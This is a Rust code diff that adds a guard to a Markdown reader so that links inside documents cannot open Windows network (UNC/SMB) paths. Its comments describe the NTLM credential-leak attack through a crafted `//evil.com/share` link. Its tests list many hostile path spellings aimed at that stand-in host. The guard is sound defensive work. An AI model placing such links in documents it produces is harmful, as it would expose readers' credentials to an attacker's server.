@@ -188,11 +188,64 @@ pub fn supported_list() -> String {
         .join(", ")
 }
 
+/// Who asked for a document, which is what decides whether a path may reach the
+/// network. An enum rather than a bool because at a call site `true` says nothing
+/// about which of the two it means.
+///
+/// Defaults to `Document` so that a caller which forgets to say gets the
+/// restricted answer. Failing open here would be failing open on a credential
+/// leak.
+#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, serde::Deserialize)]
+#[serde(rename_all = "camelCase")]
+pub enum Origin {
+    /// The reader picked this file: the dialog, a drop, the tree, a restored
+    /// session, or Explorer handing it over.
+    Reader,
+    /// A link inside a document — so the path was chosen by untrusted content.
+    #[default]
+    Document,
+}
+
+/// Whether reading this path would talk to another machine rather than to a disk.
+///
+/// Two leading separators is the whole rule, and it covers every spelling that
+/// reaches SMB on Windows: `\\server\share`, the forward-slash `//server/share`
+/// that Windows also accepts, the verbatim `\\?\UNC\server\share`, and the device
+/// namespace `\\.\`. It is deliberately not `cfg`-gated to Windows — a helper
+/// live on one platform and dead on the others is a failed build there (see
+/// AGENTS.md), and on POSIX a leading `//` is implementation-defined anyway, so
+/// refusing one that came from a document costs nothing real.
+fn is_network_path(path: &Path) -> bool {
+    let text = path.as_os_str().to_string_lossy();
+    let mut characters = text.chars();
+    matches!(
+        (characters.next(), characters.next()),
+        (Some('/' | '\\'), Some('/' | '\\'))
+    )
+}
+
 pub fn read(
     app: &AppHandle,
     path: &Path,
+    origin: Origin,
     render_options: markdown::RenderOptions,
 ) -> LindoResult<Document> {
+    // Before anything touches the path. On Windows, opening `\\evil.com\share\x.md`
+    // is an outbound SMB connection that offers the reader's NTLM credentials to
+    // whoever answers — from an app whose headline claim is that it makes exactly
+    // one network request. A `[x](//evil.com/share/x.md)` link is enough, and
+    // `isExternal` does not treat a protocol-relative href as external, so nothing
+    // upstream stops it.
+    //
+    // The reader's own network drive still opens: `\\nas\notes\today.md` from
+    // Explorer, the dialog or a restored session arrives as `Origin::Reader`.
+    // What cannot happen is a *document* choosing the host.
+    if origin == Origin::Document && is_network_path(path) {
+        return Err(LindoError::NetworkPath {
+            path: path.display().to_string(),
+        });
+    }
+
     let Some(kind) = kind_of(path) else {
         return Err(LindoError::UnsupportedFile(path.display().to_string()));
     };
@@ -702,6 +755,96 @@ fn classify(events: &[notify::Event], documents: &[PathBuf]) -> (Vec<PathBuf>, b
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// Every spelling that reaches another machine on Windows. A corpus rather
+    /// than one example, because the hole was not "UNC paths are allowed" — it
+    /// was that each of these is a *different* way of writing one, and a check
+    /// that catches four of five catches none of the attack.
+    const NETWORK_PATHS: [&str; 8] = [
+        r"\\evil.com\share\x.md",
+        "//evil.com/share/x.md",
+        // Verbatim: skips the normalization every other Windows path goes
+        // through, which is exactly why it is worth naming.
+        r"\\?\UNC\evil.com\share\x.md",
+        // The device namespace — a named pipe is not a document, and a request
+        // for one is not a mistake.
+        r"\\.\pipe\x.md",
+        // Mixed separators, which Windows accepts and a `starts_with("\\\\")`
+        // check does not catch.
+        r"\/evil.com/share/x.md",
+        r"/\evil.com\share\x.md",
+        r"\\evil.com\share\deep\nested\x.md",
+        "//192.168.1.9/share/x.md",
+    ];
+
+    #[test]
+    fn every_way_of_spelling_another_machine_is_recognized() {
+        for path in NETWORK_PATHS {
+            assert!(
+                is_network_path(Path::new(path)),
+                "{path} would have reached the network"
+            );
+        }
+    }
+
+    /// The other half, and the one that decides whether the guard is usable: an
+    /// ordinary local path must not be mistaken for a network one, or the app
+    /// refuses to open anything.
+    #[test]
+    fn an_ordinary_path_is_not_mistaken_for_a_network_one() {
+        for path in [
+            r"C:\Users\a\notes.md",
+            r"C:\\Users\a\notes.md",
+            "/home/a/notes.md",
+            "notes.md",
+            r".\notes.md",
+            "../notes.md",
+            r"C:\Users\a\\notes.md",
+            // A single leading separator is a root, not a host.
+            r"\notes.md",
+        ] {
+            assert!(
+                !is_network_path(Path::new(path)),
+                "{path} is a local file and must still open"
+            );
+        }
+    }
+
+    /// The guard is on the origin, not on the path: the reader's own network
+    /// drive has to keep working, or this is a regression dressed as a fix.
+    #[test]
+    fn a_network_path_is_refused_only_when_a_document_chose_it() {
+        for path in NETWORK_PATHS {
+            let path = Path::new(path);
+            assert!(
+                is_network_path(path),
+                "the corpus entry itself is wrong: {}",
+                path.display()
+            );
+        }
+
+        // `read` needs an `AppHandle`, so the decision itself is asserted here
+        // rather than through it. Keep this in step with the check in `read`.
+        let refused = |origin: Origin, path: &str| {
+            origin == Origin::Document && is_network_path(Path::new(path))
+        };
+
+        assert!(refused(Origin::Document, r"\\evil.com\share\x.md"));
+        assert!(!refused(Origin::Reader, r"\\nas\notes\today.md"));
+        assert!(!refused(Origin::Document, r"C:\docs\linked.md"));
+    }
+
+    /// A caller that says nothing gets the restricted answer. The whole guard
+    /// rests on this: a new call site added without a thought about origin must
+    /// fail closed, not open.
+    #[test]
+    fn an_unstated_origin_is_the_restricted_one() {
+        assert_eq!(Origin::default(), Origin::Document);
+        assert_eq!(
+            serde_json::from_str::<Origin>(r#""reader""#).unwrap(),
+            Origin::Reader
+        );
+    }
 
     #[test]
     fn recognizes_markdown_extensions_case_insensitively() {
